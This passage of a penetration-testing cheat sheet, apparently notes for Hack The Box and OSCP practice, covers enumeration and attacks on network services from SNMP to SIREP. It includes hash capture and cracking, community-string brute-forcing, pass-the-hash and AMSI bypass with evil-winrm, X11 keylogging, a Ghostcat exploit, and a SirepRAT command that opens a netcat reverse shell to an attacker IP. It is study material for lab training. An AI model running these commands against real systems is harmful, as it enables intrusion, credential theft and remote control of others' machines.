-								Command=ToggleDesktop
-							Using responder:
-								responder -I tun0
-								Note:
-									To read more about Responder tool => Read AD Exploitation Sheet
-							Cracking hash:
-								hashcat -m 5600 file.hash /usr/share/wordlists/rockyou.txt --force
-			SNMP(UDP/161):(Simple Network Management Protocol)
-				Understanding SNMP:
-					Basics:
-						Its used for collecting & exchanging management information between network devices, such as, routers, switches, servers, printers, etc in order to monitor the network devices.
-						Versions:
-							SNMPv1:
-								It uses community strings for authentication.
-								It uses UDP only.
-							SNMPv2:(aka SNMPv2c)
-								It uses community strings for authentication.
-								It uses UDP but can be configured to use TCP.
-							SNMPv3:
-								It uses MD5 or SHA hash for authentication and DES-56 for privacy.
-								It uses TCP only.
-						Components:(4)
-							A. Managed Devices:
-								Basics:
-									Managed Device refers to a network nodes, such as printers, routers, switches, etc that have SNMP enabled for either unidirectional(read) or bidirectional(read/write) communication.
-									These devices exchange node-specific information with NMSs.
-							B. SNMP Agent:
-								Basics:
-									Its a program installed on a managed device responsible for collecting management information, converting that management information into SNMP-compatible format and making it available to SNMP Manager.
-							C. NMS:(Network Management System)(aka Network Management Station)(aka SNMP Manager)
-								Basics:
-									NMS is a centralizied system responsible for managing & communicating with SNMP Agents. One or more NMS may exist in a network.
-									Note:
-										SNMP Manager is a computer thats used to run one or more NMSs in a network.
-								Functions:
-									Query SNMP agents
-									Set variables in agents
-							D. 	MIB:(Management Information Base)(aka MIB Tree)
-								Basics:
-									MIB is a virtual hierarchical tree-like database hosted by every SNMP Agent and is shared with SNMP Manager.
-									MIB is SNMP Manager uses this db to request SNMP Agent for specifc information.
-								Structure:
-									Objects & OID(Object ID):
-										Basics:
-											MIB contains "Managed Objects" having unique OID.
-										Types:(2)
-											1. Scalar OID:
-												Scalar OID is given to Scalar Objects. Scalar Object define a single object instance, for example device’s vendor name, etc.
-											2. Tabular OID:
-												Tabular OID is given to Tabular Objects. Tabular object defines multiple related object instance that are grouped together in MIB tables, for example, CPU utilization.
-						Community Strings:(aka SNMP String)
-							Basics:
-								Its used by a device for accessing MIB data from other managed devices and is only available in SNMPv1 and SNMPv2.
-							Types:(3)
-								A. Read-Only:
-									Basics:
-										This string allows access to MIB objects on a read-only basis.
-									Default Value => "Public"
-								B. Read-Write:
-									Basics:
-										This string allows access to MIB objects on a read-write basis.
-									Default Value => "Private"
-								C. SNMP Trap:(SNMPv2 Only)
-									Basics:
-					SNMP Commands:
-						GET:
-							GET is a request sent by SNMP Manager to Managed Device to retrive one or more objects.
-						GET NEXT:
-							GET NEXT is a request sent by SNMP Manager to Managed Device to retrive value of the next OID in MIB.
-						GET BULK:
-							GET BULK is used to retrive a lot of data from large MIB Trees.
-						SET:
-							SET is used by Manager to modify or assign value to Managed device.
-						TRAPS:
-							TRAPS is used by Agents by signal the SNMP Manager in case of some event.
-						INFORM:
-							INFORM is used by Agents 
-						RESPONSE:
-							RESPONSE is used by Manager in response to TRAPS commands to provide signal of action to Agents.
-				Enumeration:
-					Bruteforcing Communities:
-						OneSixtyOne:
-							Basics:
-								Its faster than hydra.
-							Usage:
-								onesixtyone -c wordlist.txt <ip>
-								Flags:
-									-c => 
-						Hydra:
-							hydra -P wordlist.txt <ip> snmp
-						Wordlists:
-							/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
-							/usr/share/seclists/Discovery/SNMP/snmp_onesixtyone.txt
-					SNMPWalk:
-						Basics:
-							SNMPWalk is a tool used to query MIB values to extract information about managed devices.
-						Usage:
-							snmpwalk -c <community string> -t 10 -v<version_number> <ip> => it will give an OID number
-								if output is "NO RESPONSE" => the given string is wrong
-							snmpwalk -c public -v<version> <ip> OID_number => enumerate users
-							Flags:
-								-c <string> => community string
-								-v => SNMP version
-								-t => 
-					SNMP-Check:
-						Basics:
-							It shows Output in a better way than snmpwalk
-						Usage:
-							snmp-check -c public <ip>
-							Flags:
-								-c => 
-						Note:
-							"snmp-check" and "snmpcheck" are completely different programs and snmpcheck dont work properly, but snmp-check works properly.
-			IRC(194/6697/6660-7000/8067):(Internet Relay Chat)
-				Understanding IRC:
-				Enumeration:
-					Connecting to IRC:
-				Exploitation:
-					unreal ircd 3.2.8.1:(HTB::irked)
-						https://github.com/MrMafiaP/PwnHouse/tree/master/CVE-2010-2075	
 			LDAP(389/636/3268/3269):(Lightweight Directory Access Protocol)
 				Basics:
 					Read Windows Internals Sheet
 				Enumeration:
 					Read AD Exploitation Sheet
-			RTSP(554/8554):(Real Time Streaming Protocol)
-				Understanding RTSP:
-				Enumeration:
-			Rsync:(873)
-				Understanding Rsync:
-					Its like a file sharing service
-				Enumeration:
-					Netcat:
-						nc -nv <ip> 873
-							Meta-commands:
-								#list => list shares
-
-								Note:
-									"#" is a part of command
-					Rsync:(Binary)
-						Basics:
-							Rsync is used to connect to the shares.
-						Usage:
-							rsync -av --list-only rsync://ip/share_name => lists files
-							rsync -av --list-only rsync://ip/share_name ./rsyncfiles => mounting the rsync share
-							rsync -a --relativ => to upload the files 
-							Flags:
-								-a => 
-								-v => 
-								--list-only => 
-								--relativ => 
-			SOCKS(1080):(Socket Secure)
-				Understanding SOCKS:
-					SOCKS Protocol:
-						Basics:
-							SOCKS is a layer 5(Session layer of OSI model) proxying internet protocol that creates a TCP connection to a server on behalf of client, and then exchange network packets between the client and server. In other words, it creates a tunnel over the protocol. However, SOCKS cannot be used to tunnel protocols which operate below layer 5 of OSI model, thus can only be used for protocols like HTTP, HTTPS, POP3, SMTP and FTP, etc.
-							Ports:
-								TCP/1080
-							Versions:
-								SOCKs4:
-								SOCKs4a:
-									Basics:
-										Its an extension of SOCKs4.
-									Advatanges:
-										1. Allows usage of domainnames instead of IP
-										2. 
-								SOCKs5:
-									Basics:
-									Advatanges:
-										1. Encryption:
-											SOCKs5 use SSH encrypted tunnel.
-										2. Authentication:
-											SOCKs5 support authentication.
-										3. IPv6 Suppot:
-										4. UDP Proxies:
-											SOCKs5 support UDP proxies.
-					Working:
-						SOCKS works in two steps:
-							1. SOCKS is a tunneling protocol:
-								SOCKS create a tunnel by setting up SOCKS server.
-							2. SOCKS is a proxying protocol:(optional)
-								SOCKS uses that tunnel's end-point as a proxy.
-						Example:
-							1. Setting up the tunnel:
-								ssh -NfD 9050 root@10.0.0.1  => This set a tunnel from my_box:9050 to 10.0.0.1 This wont give any shell(bcoz of a flag we used)
-							2. Using tunnel as a proxy:
-								Proxychains:
-									Edit proxychains:
-										127.0.0.1 9050 (that is our end of tunnel)
-									proxychains firefox
-					SOCKS Proxy:
-						Advantages:
-							Firewall
-						Disadvantages:
-							HTTP proxy handle HTTP requests better than SOCKS proxy
-				Creating SOCKS Proxy:
-					https://github.com/Bonveio/socks5-debian
-					https://www.hackingarticles.in/penetration-testing-lab-setup-microsocks/
-					Shadowsocks
-				Enumeration:
-				Exploitation:
-			Node-Red:(1880)
-				Understanding Node-Red:
-					NodeRed is a browser based editor to make flows for IoT devices and other technology to talk together	
-				Used in HTP::Frolic,HTB::Reddish
-			NFS(2049):(Network File Server)
-				Understanding NFS:
-				Enumeration:
-					Nmap:
-						nmap -p 111 --script nfs* ip => it will run all scripts related to nfs
-					Showmount:
-						Basics:
-						Usage:
-							showmount -e <IP> => show mountable folders
-							Flags:
-								-e => 
-					Mounting Shared Folders:
-						Mount:(Binary)
-							mount -t nfs <ip>:/<remote_folder> <local_folder> -o nolock => for win/lin
-							Note:
-								Read Linux Shell Commands Sheet to read more.
-				Exploitation:
-					If NFS is not configured correctly, users can upload arbitrary files (such as SSH keys) and gain access on the system.
-			Docker:(2375/2376)
-				Understanding Docker:
-				Enumeration:
-			ISCSI(3260):(Internet Small Computer Systems Interface)
-				Understanding ISCSI:
-				Enumeration:
-					Nmap:
-						nmap -sV --script=iscsi-info -p 3260 ip
-			SAPRouter:(3299)
-				Understanding SAPRouter:
-				Enumeration:
-			RDP(3389):(Remote Desktop Protocol)
-				Understanding RDP:
-				Connecting to RDP:
-					Rdesktop:
-						Basics:
-						Usage:
-							rdesktop <ip> -g 1900x600
-							Flags:
-								-g => 
-						Note:
-							sometimes, it causes issues, in that case use another tool
-					xFreeRDP:
-						Basics:
-						Usage:
-							xfreerdp /v:ip:port /u:username /p:password
-							Flags:
-								/v:<ip:port> => IP
-								/u:<user_name> or <domain_name>/<user_name> or <user_name>@<domain_name>
-								/d:<domain_name>
-								/p:<password>
-								/pth:<hash_for_pth>
-			SVN(3690):(Subversion)
-				Understanding Subversion:
-				Enumeration:
-			WS-Discovery(3702):(Web Services Discovery Protocol)
-				Understanding WS-Discovery:
-				Enumeration:
-			EPMD(4369):(Erlang Port Mapper Daemon)
-				Understanding EPMD:
-				Enumeration:
-			mDNS(5353):(Multicast DNS)
-				Understanding mDNS:
-				Enumeration:
-				Exploitation:
-			LLMNR:(5355)
-				Basics:
-					Read Windows Internals Sheet
-				Enumeration/Exploitation:
-					Read NTLM Attacks Section of AD Exploitation Sheet
-			ADB(5555):(Android Debug Bridge)
-				Understanding ADB:
-				Enumeration:
-			Kibana:(5601)
-				Understanding Kibana:
-				Enumeration:
-			VNC(5800/5801/5900.5901):(Virtual Network Computing)
-				Understanding VNC:
-					Its like RDP
-					VNC Key Authentication:
-				Enumeration:
-					Connecting to it:
-						VNCViewer:
-							Basics:
-							Usage:
-								vncviewer -passwd pass.txt <ip:port>
-								Flags:
-									-passwd => 
-				Exploitation:
-					Decrypting VNC password:
-						Read Password Cracking And Cryptography Sheet
-			WinRM(5985/5986):(Windows Remote Management)
-				Basics:
-					Read Windows Internals Sheet
-				Connecting to Winrm:
-					Evil-WinRM:(gem install evil-winrm)
-						Basics:
-						Usage:
-							evil-winrm -u user -p 'pass' -i ip -p port
-							evil-winrm -u user -H nt_hash -i ip -s /scripts => /scripts folder will contain ps1 scripts and we can directly import them
-							evil-winrm -u user -H nt_hash -i ip
-							Meta-Commands:
-								menu => show commands and modules of any loaded powershell scripts
-								Dll-Loader => 
-								Donut-Loader => 
-								Invoke-CommandAs => 
-								Invoke-ScheduledTask => 
-								Invoke-binary file.exe => 
-								Bypass-4MSI => bypasses AMSI
-									AMSI blocks binary execution
-								.ps1 Meta Commands:
-									Module names of the scripts we load in memory
-							File Transfers:
-								-s flag = .ps1 scripts
-								Inoke-Binary
-								upload local_filename destination_filename => upload file to victim
-									local files can be auto-completed using tab key. It is not needed to put a remote_path if the local file is in the same directory from which evil-winrm is invoked.
-								download remote_filename destination_filename => download from victim to us
-									it is not needed to set local_path if the remote file is in the current directory.
-							Flags:
-								-i =>
-								-u =>
-								-p =>
-								-H =>
-								-s =>
-					Crackmapexec:
-						crackmapexec winrm ip -u 'user' -p 'pass' -x command 
-			X11(6000):(aka X Window System)
-				Understanding X11:
-					Like RDP
-				Enumeration:
-					Finding info like screen size, window id
-					Connecting to it:
-						xrdp:(apt-get install x11-utils xutils-dev imagemagick libxext-dev xspy)
-							Basics:
-							Usage:
-								xrdp <ip>
-								Flags:
-					xWinInfo:
-						Basics:
-						Usage:
-							xwininfo -root -display <ip>
-							Flags:
-								-root => 
-								-display => 
-				Live Streaming:
-					Its different than connecting to it as here, we just see whats going on the screen.
-					xwatchwin:
-						Basics:
-							Installation:
-								wget http://www.ibiblio.org/pub/X11/contrib/utilities/xwatchwin.tar.gz
-								tar zxvf xwatchwin.tar.gz
-								cd xwatchwin/
-								xmkmf && make && make install
-						Usage:
-							xwatchwin <ip> -w <window_id>
-							Flags:
-								-w => 
-									window_id can be found by using xwininfo
-				KeyLogging:
-					Xspy:
-						Basics:
-						Usage:
-							xspy <ip>
-							Flags:
-			BitTorrent:(UDP/6881)
-				Understanding BitTorrent:
-					Basics:
-						Ports:
-							UDP/6881
-			AJP(8009):(Apache JServ Protocol)
-				Understanding AJP:
-					Its an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat.
-				Enumeration:
-					Nmap:
-						nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 <IP>
-				Exploitation:
-					CVE-2020-1938:(aka Ghostcat)
-						LFI vulnerability
-						Vulnerable versions:
-							Apache Tomcat 9	=> 9.0.30 and below
-							Apache Tomcat 8	=> 8.5.50 and below
-							Apache Tomcat 7	=> 7.0.99 and below
-						https://github.com/00theway/Ghostcat-CNVD-2020-10487:
-							python3 ajpShooter.py http://10.10.10.78:8080 8009 /WEB-INF/web.xml read
-			Splunk:(8089)
-				Understanding Splunk:
-				Enumeration:
-				Exploitation:
-			HTTP/HTTPS:(80/81/443/8080/8443)
-				Read WebApp Pentesting For CTF Sheet
-			dRuby:(8787)
-				Understanding dRuby:
-				Exploitation:
-					dRuby RMI Server 1.8 Exploitation:(CVE-2011-5330)
-						Metasploit:
-							exploit/linux/misc/drb_remote_codeexec
-						Manual:
-							Not yet found on google.
-							We can edit the msf exploit and run it manually => accepted in OSCP
-			ElasticSearch:(9200)
-				Understanding ElasticSearch:
-				Enumeration:
-			NDMP(10000):(Network Data Management Protocol)
-				Understanding NDMP:
-				Enumeration:
-			MemCached:(11211)
-				Understanding MemCached:
-					Memcached is a general-purpose distributed memory caching system. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source (such as a database or API) must be read.
-				Enumeration:(sudo apt install libmemcached-tools)
-					Nmap:
-						nmap -n -sV --script memcached-info -p 11211
-					MemcStat:
-						Basics:
-						Usage:
-							memcstat --servers=ip => Get stats
-							Flags:
-								--servers => 
-					MemcDump:
-						Basics:
-						Usage:
-							memcdump --servers=ip => Get all items
-							Flags:
-								--servers => 
-					MemcCat:
-						Basics:
-						Usage:
-							memccat --servers=ip <item1> <item2> <item3> => Get info inside the items
-							Flags:
-								--servers => 
-			SIREP:(29817/29819/29820)
-				Understanding SIREP:
-					Windows IOT
-				Exploitation:
-					https://www.woprsummit.org/slides-archive/SirepRAT_RCEasSYSTEMonWindowsIoTCore-WOPRSummit.pdf
-					SirepRAT:(https://github.com/SafeBreach-Labs/SirepRAT)
-						Basics:
-						Usage:
-							./SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args "/c //10.10.14.7/abcd/nc64.exe -e cmd.exe 10.10.14.7 443"
-							Flags:
-								--return_output => 
-								--as_logged_on_user => 
-								--cmd => 
-								--args => 
-				Used in HTB::omni
-			BACNet(47808):(Building Automation and Control Network)
-				Understanding BACNet:
-				Enumeration:
-			Hadoop:(50030/50060/50070/50075/50090)
-				Understanding Hadoop:
-				Enumeration:
 		Shell PPS:
 			SSH(22):(Socket Secure Shell)(aka Secure Shell)
 				Understanding SSH:
